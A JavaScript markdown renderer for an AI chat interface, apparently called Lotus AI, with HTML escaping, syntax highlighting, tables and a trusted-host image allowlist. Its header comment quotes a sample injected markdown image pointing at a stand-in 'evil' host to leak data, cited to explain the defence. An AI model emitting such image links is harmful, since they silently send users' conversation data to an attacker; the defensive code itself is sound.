/**
 * ==========================================================
 * Lotus AI - Markdown Renderer
 * ==========================================================
 * Small, dependency-free renderer for chat answers. Covers what
 * models actually produce: headings, bold/italic/strike, inline
 * code, fenced code blocks (with light syntax highlighting),
 * bullet / numbered / nested lists, block quotes, tables,
 * horizontal rules, links, bare URLs and trusted images.
 *
 * SECURITY MODEL
 * Input is HTML-escaped FIRST (including quotes), then a fixed
 * set of markdown constructs is turned into HTML. Raw HTML from a
 * model response / attached file / web page therefore can never
 * execute, and URLs can never break out of an attribute.
 * Image tags are only produced for trusted hosts — anything else
 * becomes a plain link — so injected "![](https://evil/?leak=...)"
 * can't fire a silent tracking request when a message renders.
 * ==========================================================
 */

import { escapeHtml } from "./utils.js";
import { copyText } from "./clipboard.js";

const TRUSTED_IMAGE_HOSTS = ["image.pollinations.ai"];

function esc(text) {

    return escapeHtml(text).replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

function isTrustedImageUrl(url) {

    try {

        return TRUSTED_IMAGE_HOSTS.includes(new URL(url.replace(/&amp;/g, "&")).hostname);

    } catch {

        return false;
    }
}

// ----------------------------------------------------------
// SYNTAX HIGHLIGHTING (deliberately tiny, language-agnostic)
// ----------------------------------------------------------

const KEYWORDS = new Set((
    "break case catch class const continue default delete do else export extends finally for function if " +
    "import in instanceof let new of return static super switch this throw try typeof var void while with yield " +
    "async await def elif lambda pass from as is not and or global nonlocal raise assert del except print " +
    "public private protected final package interface enum struct fn mut impl pub match go func chan " +
    "select defer namespace using int float double long short char string bool boolean byte unsigned"
).split(/\s+/));

const SQL_KEYWORDS = new Set((
    "select insert update delete create table where join left right inner outer on group order by limit values " +
    "set into alter drop from as and or not null primary key foreign references index distinct having union " +
    "case when then else end like in is exists between asc desc count sum avg min max"
).split(/\s+/));

const SHELL_KEYWORDS = new Set((
    "if then else elif fi for while do done case esac function echo export local source cd return in"
).split(/\s+/));

const LITERALS = new Set(["true", "false", "null", "undefined", "None", "True", "False", "nil", "NaN", "Infinity", "TRUE", "FALSE", "NULL"]);

const PLAIN_LANGS = new Set(["", "text", "txt", "plain", "plaintext", "output", "log", "console", "diff", "markdown", "md"]);

const HASH_COMMENT_LANGS = new Set([
    "python", "py", "bash", "sh", "shell", "zsh", "yaml", "yml", "toml", "ruby", "rb", "r",
    "dockerfile", "makefile", "ini", "conf", "perl", "powershell", "ps1", "properties"
]);

const COMMENT_SOURCES = {
    hash: "#[^\\n]*",
    css: "\\/\\*[\\s\\S]*?\\*\\/",
    sql: "--[^\\n]*|\\/\\*[\\s\\S]*?\\*\\/",
    c: "\\/\\/[^\\n]*|\\/\\*[\\s\\S]*?\\*\\/"
};

const tokenRegexCache = {};

function getTokenRegex(style) {

    if (!tokenRegexCache[style]) {

        const strings =
            "\"\"\"[\\s\\S]*?\"\"\"|'''[\\s\\S]*?'''|" +
            "\"(?:\\\\.|[^\"\\\\\\n])*\"|'(?:\\\\.|[^'\\\\\\n])*'|`(?:\\\\.|[^`\\\\])*`";

        const numbers = "\\b0x[0-9a-fA-F]+\\b|\\b\\d[\\d_]*(?:\\.\\d+)?(?:[eE][+-]?\\d+)?\\b";

        const identifiers = "([A-Za-z_$][\\w$]*)(\\s*\\()?";

        tokenRegexCache[style] = new RegExp(
            `(${COMMENT_SOURCES[style]})|(${strings})|(${numbers})|${identifiers}`,
            "g"
        );
    }

    return tokenRegexCache[style];
}

function span(cls, text) {

    return `<span class="tok-${cls}">${esc(text)}</span>`;
}

function highlightMarkup(code) {

    const pattern = /(<!--[\s\S]*?-->)|(<\/?)([A-Za-z][\w:-]*)((?:\s+[^\s=>/]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?)*)(\s*\/?>)|([^<]+|<)/g;

    let html = "";
    let match;

    while ((match = pattern.exec(code))) {

        if (match[1]) {

            html += span("c", match[1]);

        } else if (match[3]) {

            html += span("p", match[2]) + span("k", match[3]);

            html += match[4].replace(/(\s+)([^\s=>/]+)(\s*=\s*)?("[^"]*"|'[^']*'|[^\s>]+)?/g, (all, space, name, eq, value) =>
                esc(space) + span("f", name) + (eq ? span("p", eq) : "") + (value ? span("s", value) : "")
            );

            html += span("p", match[5]);

        } else {

            html += esc(match[6]);
        }
    }

    return html;
}

function isKeyword(word, language, style) {

    if (style === "sql") return SQL_KEYWORDS.has(word.toLowerCase());

    if (["bash", "sh", "shell", "zsh"].includes(language)) return SHELL_KEYWORDS.has(word);

    return KEYWORDS.has(word);
}

export function highlightCode(code, lang = "") {

    const language = String(lang).toLowerCase().trim();

    if (PLAIN_LANGS.has(language)) return esc(code);

    if (["html", "xml", "svg", "vue", "jsx", "tsx"].includes(language) && /^\s*</.test(code)) {

        return highlightMarkup(code);
    }

    let style = "c";

    if (HASH_COMMENT_LANGS.has(language)) style = "hash";
    else if (language === "css" || language === "scss" || language === "less") style = "css";
    else if (language === "sql") style = "sql";

    const regex = getTokenRegex(style);

    regex.lastIndex = 0;

    let html = "";
    let last = 0;
    let match;

    while ((match = regex.exec(code))) {

        html += esc(code.slice(last, match.index));

        last = match.index + match[0].length;

        const [whole, comment, string, number, identifier, paren] = match;

        if (comment) {

            html += span("c", comment);

        } else if (string) {

            const isKey = /^\s*:/.test(code.slice(last)) && !/^\s*::/.test(code.slice(last));

            html += span(isKey ? "key" : "s", string);

        } else if (number) {

            html += span("n", number);

        } else if (identifier) {

            if (isKeyword(identifier, language, style)) {

                html += span("k", identifier) + esc(paren || "");

            } else if (LITERALS.has(identifier)) {

                html += span("n", identifier) + esc(paren || "");

            } else if (paren) {

                html += span("f", identifier) + esc(paren);

            } else if (/^[A-Z][a-z]/.test(identifier)) {

                html += span("t", identifier);

            } else {

                html += esc(identifier);
            }

        } else {

            html += esc(whole);
        }
    }

    html += esc(code.slice(last));

    return html;
}

// ----------------------------------------------------------
// INLINE
// ----------------------------------------------------------

const URL_CHARS = "[^\\s<>\"')\\]]*[^\\s<>\"')\\].,;:!?]";

export function renderInline(text) {

    const stash = [];

    const hold = html => {

        stash.push(html);

        return `\u0001${stash.length - 1}\u0001`;
    };

    const codes = [];

    let out = text.replace(/`([^`\n]+)`/g, (_, code) => {

        codes.push(code);

        return `\u0002${codes.length - 1}\u0002`;
    });

    // images — only trusted hosts render as <img>
    out = out.replace(/!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/g, (match, alt, url) =>
        hold(
            isTrustedImageUrl(url)
                ? `<img src="${url}" alt="${alt}" loading="lazy" decoding="async" class="message-image">`
                : `<a href="${url}" target="_blank" rel="noopener noreferrer">${alt || url}</a>`
        )
    );

    // [text](url)
    out = out.replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, (match, label, url) =>
        hold(`<a href="${url}" target="_blank" rel="noopener noreferrer">${renderInline(label)}</a>`)
    );

    // bare URLs
    out = out.replace(new RegExp(`(^|[\\s(>])(https?:\\/\\/${URL_CHARS})`, "g"), (match, lead, url) =>
        lead + hold(`<a href="${url}" target="_blank" rel="noopener noreferrer">${url}</a>`)
    );

    out = out
        .replace(/\*\*(?=\S)(.+?)(?<=\S)\*\*/g, "<strong>$1</strong>")
        .replace(/(?<![\w])__(?=\S)(.+?)(?<=\S)__(?![\w])/g, "<strong>$1</strong>")
        .replace(/(?<!\*)\*(?![\s*])(.+?)(?<![\s*])\*(?!\*)/g, "<em>$1</em>")
        .replace(/(?<![\w])_(?![\s_])(.+?)(?<![\s_])_(?![\w])/g, "<em>$1</em>")
        .replace(/~~(?=\S)(.+?)(?<=\S)~~/g, "<del>$1</del>");

    // restore (stash entries may themselves hold code placeholders)
    out = out.replace(/\u0001(\d+)\u0001/g, (_, i) => stash[Number(i)]);

    out = out.replace(/\u0002(\d+)\u0002/g, (_, i) => `<code>${codes[Number(i)]}</code>`);

    return out;
}

// ----------------------------------------------------------
// BLOCKS
// ----------------------------------------------------------

const LIST_ITEM = /^(\s*)([-*+•]|\d{1,3}[.)])\s+(.*)$/;
const HEADING = /^\s{0,3}(#{1,4})\s+(.+?)\s*#*\s*$/;
const HR = /^\s{0,3}([-*_])(?:\s*\1){2,}\s*$/;
const QUOTE = /^\s{0,3}&gt;\s?/;
const TABLE_SEPARATOR = /^\s*\|?\s*:?-+:?\s*(\|\s*:?-+:?\s*)*\|?\s*$/;

function splitRow(line) {

    let row = line.trim();

    if (row.startsWith("|")) row = row.slice(1);
    if (row.endsWith("|")) row = row.slice(0, -1);

    return row.split("|").map(cell => cell.trim());
}

function isTableStart(lines, index) {

    return (
        lines[index].includes("|") &&
        index + 1 < lines.length &&
        lines[index + 1].includes("-") &&
        TABLE_SEPARATOR.test(lines[index + 1]) &&
        splitRow(lines[index]).length === splitRow(lines[index + 1]).length
    );
}

function isBlockStart(lines, index) {

    const line = lines[index];

    return (
        HEADING.test(line) ||
        HR.test(line) ||
        QUOTE.test(line) ||
        LIST_ITEM.test(line) ||
        isTableStart(lines, index)
    );
}

function buildList(items) {

    let position = 0;

    function build(baseIndent) {

        const first = items[position];

        const tag = first.ordered ? "ol" : "ul";

        const startAttr = first.ordered && first.number !== 1 ? ` start="${first.number}"` : "";

        let html = `<${tag}${startAttr}>`;

        while (position < items.length && items[position].indent >= baseIndent) {

            const item = items[position];

            position++;

            let inner = renderInline(item.text).replace(/\n/g, "<br>");

            if (position < items.length && items[position].indent > item.indent) {

                inner += build(items[position].indent);
            }

            html += `<li>${inner}</li>`;
        }

        return `${html}</${tag}>`;
    }

    return build(items[0].indent);
}

function renderBlocks(escapedText) {

    const lines = escapedText.replace(/\r\n?/g, "\n").split("\n");

    const out = [];

    let i = 0;

    while (i < lines.length) {

        const line = lines[i];

        if (!line.trim()) {

            i++;

            continue;
        }

        let match = line.match(HEADING);

        if (match) {

            const level = match[1].length;

            out.push(`<h${level}>${renderInline(match[2])}</h${level}>`);

            i++;

            continue;
        }

        if (HR.test(line)) {

            out.push("<hr>");

            i++;

            continue;
        }

        if (QUOTE.test(line)) {

            const quoted = [];

            while (i < lines.length && QUOTE.test(lines[i])) {

                quoted.push(lines[i].replace(QUOTE, ""));

                i++;
            }

            out.push(`<blockquote>${renderBlocks(quoted.join("\n"))}</blockquote>`);

            continue;
        }

        if (isTableStart(lines, i)) {

            const header = splitRow(lines[i]);

            const aligns = splitRow(lines[i + 1]).map(cell => {

                const left = cell.startsWith(":");
                const right = cell.endsWith(":");

                return left && right ? "center" : right ? "right" : left ? "left" : "";
            });

            i += 2;

            const rows = [];

            while (i < lines.length && lines[i].trim() && lines[i].includes("|")) {

                rows.push(splitRow(lines[i]));

                i++;
            }

            const cell = (tag, text, index) =>
                `<${tag}${aligns[index] ? ` style="text-align:${aligns[index]}"` : ""}>${renderInline(text ?? "")}</${tag}>`;

            out.push(
                `<div class="table-wrap"><table><thead><tr>${header.map((text, index) => cell("th", text, index)).join("")}</tr></thead>` +
                `<tbody>${rows.map(row => `<tr>${header.map((_, index) => cell("td", row[index], index)).join("")}</tr>`).join("")}</tbody></table></div>`
            );

            continue;
        }

        if (LIST_ITEM.test(line)) {

            const items = [];

            while (i < lines.length) {

                const itemMatch = lines[i].match(LIST_ITEM);

                if (itemMatch) {

                    items.push({
                        indent: itemMatch[1].replace(/\t/g, "    ").length,
                        ordered: /\d/.test(itemMatch[2]),
                        number: parseInt(itemMatch[2], 10),
                        text: itemMatch[3]
                    });

                    i++;

                } else if (items.length && lines[i].trim() && /^\s{2,}\S/.test(lines[i]) && !isBlockStart(lines, i)) {

                    items[items.length - 1].text += "\n" + lines[i].trim();

                    i++;

                } else {

                    break;
                }
            }

            out.push(buildList(items));

            continue;
        }

        // paragraph — gathers soft-wrapped lines until the next block
        const paragraph = [];

        while (i < lines.length && lines[i].trim() && (paragraph.length === 0 || !isBlockStart(lines, i))) {

            paragraph.push(lines[i]);

            i++;
        }

        out.push(`<p>${renderInline(paragraph.join("\n")).replace(/\n/g, "<br>")}</p>`);
    }

    return out.join("");
}

// ----------------------------------------------------------
// PUBLIC
// ----------------------------------------------------------

export function renderMarkdown(rawText) {

    const segments = String(rawText ?? "").split(/```/g);

    let html = "";

    segments.forEach((segment, index) => {

        if (index % 2 === 1) {

            const firstLineBreak = segment.indexOf("\n");

            const lang = firstLineBreak === -1 ? "" : segment.slice(0, firstLineBreak).trim();

            const code = (firstLineBreak === -1 ? segment : segment.slice(firstLineBreak + 1)).replace(/\n$/, "");

            html += `
                <div class="code-block">
                    <div class="code-block-header">
                        <span>${esc(lang || "kod")}</span>
                        <button class="code-copy-button" type="button">Kopyala</button>
                    </div>
                    <pre><code>${highlightCode(code, lang)}</code></pre>
                </div>
            `;

        } else if (segment.trim()) {

            html += renderBlocks(esc(segment));
        }
    });

    return html;
}

/**
 * Wires up "Kopyala" buttons rendered inside code blocks by
 * renderMarkdown(). Call once after inserting HTML into the DOM.
 */
export function bindCodeCopyButtons(container) {

    container.querySelectorAll(".code-copy-button").forEach(button => {

        if (button.dataset.bound) return;

        button.dataset.bound = "true";

        button.addEventListener("click", async () => {

            const code = button.closest(".code-block")?.querySelector("code")?.textContent ?? "";

            const ok = await copyText(code);

            const original = "Kopyala";

            button.textContent = ok ? "Kopyalandı" : "Kopyalanamadı";

            button.classList.toggle("copied", ok);

            setTimeout(() => {

                button.textContent = original;

                button.classList.remove("copied");

            }, 1600);
        });
    });
}
